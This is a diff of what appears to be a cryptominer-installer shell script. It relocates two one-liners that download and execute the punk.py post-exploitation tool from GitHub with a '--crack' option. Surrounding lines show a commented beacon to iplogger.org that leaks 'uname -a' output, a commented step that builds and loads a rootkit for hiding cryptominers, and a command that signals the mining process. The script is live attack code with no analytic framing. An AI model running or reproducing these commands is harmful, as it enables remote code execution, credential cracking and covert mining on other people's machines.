@@ -471,9 +471,6 @@ systemctl status swapd
 
 #$(curl -s -k https://iplogger.org/133yw7 --user-agent "Mozilla 5.0" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="Mozilla 5.0" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
 
-python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
-python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack
-
 
 #echo "[*] Installing r00tkit"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
@@ -578,6 +575,9 @@ fi
 
 
 kill -31 $(pgrep -f -u root config.json)
+
+python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
+python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
